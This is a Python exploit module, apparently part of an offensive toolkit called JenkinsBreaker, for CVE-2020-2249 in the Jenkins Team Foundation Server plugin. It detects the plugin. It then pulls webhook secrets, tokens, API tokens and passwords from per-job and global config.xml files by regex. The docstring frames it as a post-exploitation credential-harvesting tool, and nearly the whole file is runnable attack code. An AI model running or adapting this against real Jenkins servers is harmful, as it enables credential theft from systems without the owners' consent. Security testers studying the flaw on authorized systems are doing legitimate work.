"""
CVE-2020-2249: Jenkins Team Foundation Server Plugin Credential Exposure

This vulnerability allows reading unencrypted webhook secrets from Jenkins configuration
files. Useful for post-exploitation credential harvesting.
"""

import requests
import re
import os
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2020-2249"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins TFS Plugin Credential Exposure",
    description="Unencrypted webhook secret storage allowing credential extraction",
    affected_versions=["TFS Plugin <= 5.157.0"],
    mitre_attack=["T1552", "T1552.001", "T1555"],
    severity="medium",
    references=[
        "https://www.jenkins.io/security/advisory/2020-09-16/",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-2249",
        "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.plugins/tfs/CVE-2020-2249"
    ],
    requires_auth=True,
    requires_crumb=False,
    tags=["credential-exposure", "post-exploitation", "secrets"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has TFS plugin installed.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if TFS plugin detected, False otherwise
    """
    try:
        r = requests.get(
            f"{tool.jenkins_url}/pluginManager/api/json?depth=1",
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            plugins = data.get('plugins', [])
            
            for plugin in plugins:
                if 'tfs' in plugin.get('shortName', '').lower():
                    version = plugin.get('version', '')
                    console.print(f"[cyan][*] TFS Plugin detected: version {version}[/cyan]")
                    return True
        
        return False
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2020-2249 to extract TFS webhook secrets.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Not used for this exploit
        lport: Not used for this exploit
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (TFS Credential Exposure)...[/yellow]")
    
    extracted_secrets = []
    
    config_endpoints = [
        '/job/{job}/config.xml',
        '/config.xml',
        '/configure',
    ]
    
    try:
        jobs_url = f"{tool.jenkins_url}/api/json?tree=jobs[name]"
        r = requests.get(
            jobs_url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        job_names = []
        if r.status_code == 200:
            data = r.json()
            job_names = [job['name'] for job in data.get('jobs', [])]
            console.print(f"[cyan][*] Found {len(job_names)} jobs to scan...[/cyan]")
    except Exception as e:
        console.print(f"[yellow][!] Could not enumerate jobs: {e}[/yellow]")
        job_names = []
    
    for job_name in job_names:
        try:
            config_url = f"{tool.jenkins_url}/job/{job_name}/config.xml"
            r = requests.get(
                config_url,
                auth=tool.auth,
                headers=tool.custom_headers,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code == 200:
                xml_content = r.text
                
                tfs_patterns = [
                    r'<webhookSecret>([^<]+)</webhookSecret>',
                    r'<tfsSecret>([^<]+)</tfsSecret>',
                    r'<secret>([^<]+)</secret>',
                    r'<token>([^<]+)</token>',
                ]
                
                for pattern in tfs_patterns:
                    matches = re.findall(pattern, xml_content, re.IGNORECASE)
                    for match in matches:
                        if match and match not in extracted_secrets:
                            extracted_secrets.append({
                                "job": job_name,
                                "type": "webhook_secret",
                                "value": match[:20] + "..." if len(match) > 20 else match
                            })
                            console.print(f"[green][+] Found secret in job '{job_name}'[/green]")
        
        except Exception as e:
            console.print(f"[yellow][!] Error scanning job '{job_name}': {e}[/yellow]")
    
    try:
        console.print("[cyan][*] Checking global configuration...[/cyan]")
        config_url = f"{tool.jenkins_url}/config.xml"
        r = requests.get(
            config_url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            xml_content = r.text
            
            secret_patterns = [
                r'<webhookSecret>([^<]+)</webhookSecret>',
                r'<apiToken>([^<]+)</apiToken>',
                r'<password>([^<]+)</password>',
            ]
            
            for pattern in secret_patterns:
                matches = re.findall(pattern, xml_content, re.IGNORECASE)
                for match in matches:
                    if match and len(match) > 5:
                        extracted_secrets.append({
                            "location": "global_config",
                            "type": "secret",
                            "value": match[:20] + "..." if len(match) > 20 else match
                        })
                        console.print(f"[green][+] Found secret in global config[/green]")
    
    except Exception as e:
        console.print(f"[yellow][!] Could not access global config: {e}[/yellow]")
    
    if extracted_secrets:
        console.print(f"[green][+] Successfully extracted {len(extracted_secrets)} secrets[/green]")
        return ExploitResult(
            exploit=CVE_ID,
            status="success",
            details=f"Extracted {len(extracted_secrets)} unencrypted secrets",
            data={
                "secrets_count": len(extracted_secrets),
                "secrets": extracted_secrets
            }
        )
    else:
        console.print("[yellow][-] No exposed secrets found (may be patched or no TFS plugin)[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="not_vulnerable",
            details="No unencrypted secrets found in accessible configurations"
        )
